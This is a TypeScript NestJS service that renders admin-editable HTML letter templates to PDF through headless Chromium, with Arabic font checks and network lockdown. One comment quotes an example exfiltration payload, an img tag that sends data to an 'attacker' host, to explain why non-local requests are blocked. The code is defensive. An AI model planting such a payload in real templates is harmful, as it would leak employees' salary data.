import {
  Injectable,
  Logger,
  OnModuleDestroy,
  OnModuleInit,
  ServiceUnavailableException,
} from '@nestjs/common';
import { existsSync } from 'fs';
import * as Handlebars from 'handlebars';
import type { Browser, Page } from 'puppeteer-core';
import { SystemSettingsService } from '../system-settings/system-settings.service';

export interface PdfRenderOptions {
  format?: 'A4' | 'A5' | 'Letter' | 'Legal';
  landscape?: boolean;
  margin?: { top?: string; right?: string; bottom?: string; left?: string };
  printBackground?: boolean;
  headerHtml?: string;
  footerHtml?: string;
  /**
   * Override the render deadline, clamped to {@link MAX_RENDER_TIMEOUT_MS}.
   *
   * Only the bulk drainer passes this. 30s is right for an HTTP request path
   * and wrong for a 200-page merged register, but relaxing it on a
   * user-facing route would just move a hang from the renderer to the proxy.
   */
  timeoutMs?: number;
}

/** What {@link PdfService.diagnose} reports. Drives GET /documents/health. */
export interface PdfDiagnostics {
  pdfEnabled: boolean;
  chromiumPath: string | null;
  chromiumVersion: string | null;
  browserLaunchOk: boolean;
  probeRenderMs: number | null;
  /** Families the renderer can actually SHAPE with, not merely resolve. */
  fonts: { latin: boolean; arabic: boolean; missing: string[] };
  lastRenderError: string | null;
}

/** Distro locations tried when CHROMIUM_PATH is unset. */
const CHROMIUM_CANDIDATES = [
  '/usr/bin/chromium',
  '/usr/bin/chromium-browser',
  '/usr/bin/google-chrome',
  '/usr/bin/google-chrome-stable',
  '/snap/bin/chromium',
];

const DEFAULT_MARGIN = {
  top: '20mm',
  right: '18mm',
  bottom: '20mm',
  left: '18mm',
};

/** A page that never settles must not hold a request open forever. */
const RENDER_TIMEOUT_MS = 30_000;

/** Ceiling for {@link PdfRenderOptions.timeoutMs}. Beyond this a render is stuck. */
const MAX_RENDER_TIMEOUT_MS = 120_000;

/**
 * Schemes a render page may load. Everything else is aborted.
 *
 * The module contract has always been "nothing is fetched over the network" —
 * this is what makes that enforced rather than merely asserted. It matters
 * because letter templates are ADMIN-EDITABLE HTML: without it, a template
 * carrying `<img src="https://attacker/?data=...">` is an exfiltration channel
 * out of a process that can see salary figures, and a template carrying an
 * internal URL is an SSRF probe. It is also what makes `domcontentloaded`
 * (below) correct rather than merely fast: there is provably nothing to wait for.
 */
const ALLOWED_REQUEST_PREFIXES = ['data:', 'about:blank', 'blob:'];

/**
 * Probe document for {@link PdfService.diagnose}.
 *
 * Each string is laid out twice: once in the family we expect to be installed,
 * once in a family that cannot exist. Equal widths mean the named family
 * resolved to the same last-resort fallback, i.e. it is not really there.
 * `white-space: pre` so the boxes are sized by the text, not by the line box.
 */
const PROBE_HTML = `<!doctype html><html><head><meta charset="utf-8"><style>
  span { font-size: 40px; white-space: pre; display: inline-block; }
  #latin { font-family: 'Liberation Sans'; }
  #latin-fallback { font-family: 'ZZ No Such Family ZZ'; }
  #arabic { font-family: 'Noto Sans Arabic', 'Noto Naskh Arabic'; }
  #arabic-fallback { font-family: 'ZZ No Such Family ZZ'; }
</style></head><body>
  <div><span id="latin">Salary Certificate</span></div>
  <div><span id="latin-fallback">Salary Certificate</span></div>
  <div dir="rtl"><span id="arabic">شهادة راتب</span></div>
  <div dir="rtl"><span id="arabic-fallback">شهادة راتب</span></div>
</body></html>`;

/**
 * HTML → PDF via headless Chromium.
 *
 * Chromium is used rather than a pure-JS PDF library because this is a
 * bilingual (en + ar) deployment: Arabic needs contextual glyph shaping and
 * bidirectional reordering, which only a real text-shaping engine does
 * correctly. Chromium embeds HarfBuzz; `@react-pdf/renderer` and PDFKit render
 * Arabic as isolated, wrongly-ordered letters.
 *
 * `puppeteer-core` (not `puppeteer`) so npm install does not download a second
 * browser — the binary comes from the image, located via CHROMIUM_PATH.
 *
 * The browser is launched lazily and reused: launching per request costs
 * ~300ms and a lot of memory. Callers must not assume it is running.
 */
@Injectable()
export class PdfService implements OnModuleInit, OnModuleDestroy {
  private readonly logger = new Logger(PdfService.name);
  private browser: Browser | null = null;
  private launching: Promise<Browser> | null = null;
  private readonly templateCache = new Map<string, HandlebarsTemplateDelegate>();
  /** Last render failure, surfaced by {@link diagnose}. */
  private lastRenderError: string | null = null;

  constructor(private readonly settings: SystemSettingsService) {}

  /**
   * Say at BOOT that this deployment cannot render, rather than letting the
   * first person who asks for a letter discover it.
   *
   * Until this existed the only signal was a 400 reading "PDF generation is
   * unavailable on this deployment" — which reads like a policy decision an
   * admin made, not a missing package, so it got triaged as a support question
   * instead of a deployment one.
   */
  async onModuleInit(): Promise<void> {
    // Never let a diagnostic take the app down with it.
    try {
      const enabled = await this.settings.getSetting('pdf_enabled', 'true');
      if (enabled === 'false') return;
      if (this.resolveExecutable()) return;
      const configured = process.env.CHROMIUM_PATH?.trim();
      this.logger.error(
        `pdf_enabled is on but no Chromium binary was found — every letter, ` +
          `certificate and document PDF will be refused. ` +
          (configured
            ? `CHROMIUM_PATH=${configured} does not exist.`
            : `CHROMIUM_PATH is unset; tried ${CHROMIUM_CANDIDATES.join(', ')}.`) +
          ` Install chromium in the image or set pdf_enabled=false.`,
      );
    } catch {
      // A settings read that fails at boot is its own, louder problem.
    }
  }

  async onModuleDestroy() {
    if (this.browser) {
      await this.browser.close().catch(() => undefined);
      this.browser = null;
    }
  }

  /** Resolved Chromium binary, or null when none is present. */
  private resolveExecutable(): string | null {
    const configured = process.env.CHROMIUM_PATH?.trim();
    if (configured) return existsSync(configured) ? configured : null;
    return CHROMIUM_CANDIDATES.find((p) => existsSync(p)) ?? null;
  }

  /**
   * Whether PDF rendering can actually run here. Lets callers degrade to
   * "download unavailable" instead of surfacing a 500 — a deployment without
   * Chromium must stay usable for everything else.
   */
  async isAvailable(): Promise<boolean> {
    const enabled = await this.settings.getSetting('pdf_enabled', 'true');
    if (enabled === 'false') return false;
    return this.resolveExecutable() !== null;
  }

  private async getBrowser(): Promise<Browser> {
    if (this.browser?.connected) return this.browser;
    // Concurrent callers share one launch instead of racing several.
    if (this.launching) return this.launching;

    const executablePath = this.resolveExecutable();
    if (!executablePath) {
      throw new ServiceUnavailableException(
        'PDF rendering is unavailable: no Chromium binary found. Set CHROMIUM_PATH or install chromium in the image.',
      );
    }

    // Required lazily (not a top-level import) so a deployment that never
    // renders a PDF does not pay the module load cost, and so the app still
    // boots if the package is absent. `require` rather than dynamic `import`:
    // the build targets CommonJS, and dynamic import breaks under Jest's VM.
    // Same pattern as ExportService's exceljs require.
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const { launch } = require('puppeteer-core') as typeof import('puppeteer-core');

    this.launching = launch({
      executablePath,
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        // Containers default to a 64MB /dev/shm, which Chromium overruns and
        // then crashes mid-render.
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--font-render-hinting=none',
      ],
    })
      .then((browser) => {
        this.browser = browser;
        this.logger.log(`Chromium launched from ${executablePath}`);
        browser.on('disconnected', () => {
          this.browser = null;
        });
        return browser;
      })
      .finally(() => {
        this.launching = null;
      });

    return this.launching;
  }

  /**
   * Render a complete HTML document to a PDF buffer.
   *
   * The caller owns the markup, including `<html dir="rtl">` and an Arabic-
   * capable font stack for Arabic documents. Nothing is fetched over the
   * network — the page is set directly and only local resources resolve.
   */
  async renderHtml(html: string, opts: PdfRenderOptions = {}): Promise<Buffer> {
    if ((await this.settings.getSetting('pdf_enabled', 'true')) === 'false') {
      throw new ServiceUnavailableException('PDF rendering is disabled');
    }

    const timeout = this.resolveTimeout(opts.timeoutMs);
    const browser = await this.getBrowser();
    const page = await browser.newPage();
    try {
      page.setDefaultTimeout(timeout);
      await this.lockDownNetwork(page);
      // `domcontentloaded` rather than `networkidle0`: documents are
      // self-contained, and networkidle would wait out the full timeout on any
      // reference that cannot resolve.
      await page.setContent(html, {
        waitUntil: 'domcontentloaded',
        timeout,
      });
      // Let webfonts finish before painting, or Arabic falls back to a font
      // that cannot shape it.
      await page
        .evaluate(() => (document as any).fonts?.ready)
        .catch(() => undefined);

      const buffer = await page.pdf({
        format: opts.format ?? 'A4',
        landscape: opts.landscape ?? false,
        printBackground: opts.printBackground ?? true,
        margin: { ...DEFAULT_MARGIN, ...(opts.margin ?? {}) },
        displayHeaderFooter: Boolean(opts.headerHtml || opts.footerHtml),
        headerTemplate: opts.headerHtml ?? '<span></span>',
        footerTemplate: opts.footerHtml ?? '<span></span>',
        timeout,
      });
      this.lastRenderError = null;
      return Buffer.from(buffer);
    } catch (err) {
      this.lastRenderError = err instanceof Error ? err.message : String(err);
      throw err;
    } finally {
      // Always close the tab; a leaked page keeps its renderer process alive.
      await page.close().catch(() => undefined);
    }
  }

  /** Callers may lengthen the deadline but never remove it. */
  private resolveTimeout(requested?: number): number {
    if (!requested || !Number.isFinite(requested) || requested <= 0) {
      return RENDER_TIMEOUT_MS;
    }
    return Math.min(Math.trunc(requested), MAX_RENDER_TIMEOUT_MS);
  }

  /**
   * Abort every subresource that is not already in the document.
   *
   * See {@link ALLOWED_REQUEST_PREFIXES}. A blocked request surfaces as a
   * broken image in the PDF, which is the correct outcome: the engine inlines
   * brand assets as `data:` URIs precisely so nothing has to be fetched.
   */
  private async lockDownNetwork(page: Page): Promise<void> {
    await page.setRequestInterception(true);
    page.on('request', (req) => {
      const url = req.url();
      const allowed = ALLOWED_REQUEST_PREFIXES.some((p) => url.startsWith(p));
      if (allowed) {
        req.continue().catch(() => undefined);
      } else {
        this.logger.warn(`Blocked non-local resource in PDF render: ${url}`);
        req.abort('blockedbyclient').catch(() => undefined);
      }
    });
  }

  /**
   * Prove the renderer works, rather than stat-ing a file and hoping.
   *
   * Font presence is checked by MEASUREMENT, not by asking whether the family
   * resolves: a family fontconfig knows about but Chromium cannot shape with
   * reports as present and still renders tofu. Comparing an Arabic string set
   * in the named family against the same string set in a family that certainly
   * does not exist is the only check that can tell those apart.
   */
  async diagnose(): Promise<PdfDiagnostics> {
    const pdfEnabled =
      (await this.settings.getSetting('pdf_enabled', 'true')) !== 'false';
    const chromiumPath = this.resolveExecutable();

    const result: PdfDiagnostics = {
      pdfEnabled,
      chromiumPath,
      chromiumVersion: null,
      browserLaunchOk: false,
      probeRenderMs: null,
      fonts: { latin: false, arabic: false, missing: [] },
      lastRenderError: this.lastRenderError,
    };
    if (!pdfEnabled || !chromiumPath) {
      result.fonts.missing = ['(not probed — renderer unavailable)'];
      return result;
    }

    const startedAt = Date.now();
    try {
      const browser = await this.getBrowser();
      result.browserLaunchOk = true;
      result.chromiumVersion = await browser.version().catch(() => null);

      const page = await browser.newPage();
      try {
        page.setDefaultTimeout(RENDER_TIMEOUT_MS);
        await this.lockDownNetwork(page);
        await page.setContent(PROBE_HTML, {
          waitUntil: 'domcontentloaded',
          timeout: RENDER_TIMEOUT_MS,
        });
        await page
          .evaluate(() => (document as any).fonts?.ready)
          .catch(() => undefined);

        const widths = await page.evaluate(() => {
          const w = (id: string) =>
            (document.getElementById(id) as HTMLElement | null)
              ?.getBoundingClientRect().width ?? 0;
          return {
            latin: w('latin'),
            latinFallback: w('latin-fallback'),
            arabic: w('arabic'),
            arabicFallback: w('arabic-fallback'),
          };
        });

        // A named family that is genuinely installed lays the same string out
        // differently from the browser's last-resort fallback. Identical widths
        // mean the name resolved to nothing.
        result.fonts.latin =
          widths.latin > 0 && widths.latin !== widths.latinFallback;
        result.fonts.arabic =
          widths.arabic > 0 && widths.arabic !== widths.arabicFallback;
        if (!result.fonts.latin) result.fonts.missing.push('Liberation Sans');
        if (!result.fonts.arabic) result.fonts.missing.push('Noto Sans Arabic');

        // Actually produce a PDF — launching and laying out are not the same
        // thing as printing, and printing is what fails under a starved /dev/shm.
        const buf = await page.pdf({ format: 'A4', timeout: RENDER_TIMEOUT_MS });
        if (Buffer.from(buf).subarray(0, 5).toString('latin1') !== '%PDF-') {
          throw new Error('probe render did not produce a PDF');
        }
        result.probeRenderMs = Date.now() - startedAt;
      } finally {
        await page.close().catch(() => undefined);
      }
    } catch (err) {
      result.lastRenderError = err instanceof Error ? err.message : String(err);
    }
    return result;
  }

  /**
   * Compile a Handlebars source string, then render it.
   *
   * Takes a source string rather than a filename because letter templates are
   * DB rows (admin-editable, one per locale), not files on disk.
   *
   * `cacheKey` opts into compiled-template reuse; pass a value that changes
   * whenever the source does, e.g. `${templateId}:${updatedAt}`.
   */
  async renderHandlebars(
    source: string,
    context: Record<string, unknown>,
    opts: PdfRenderOptions & { cacheKey?: string } = {},
  ): Promise<Buffer> {
    let template = opts.cacheKey
      ? this.templateCache.get(opts.cacheKey)
      : undefined;
    if (!template) {
      template = Handlebars.compile(source);
      if (opts.cacheKey) this.templateCache.set(opts.cacheKey, template);
    }
    return this.renderHtml(template(context), opts);
  }
}
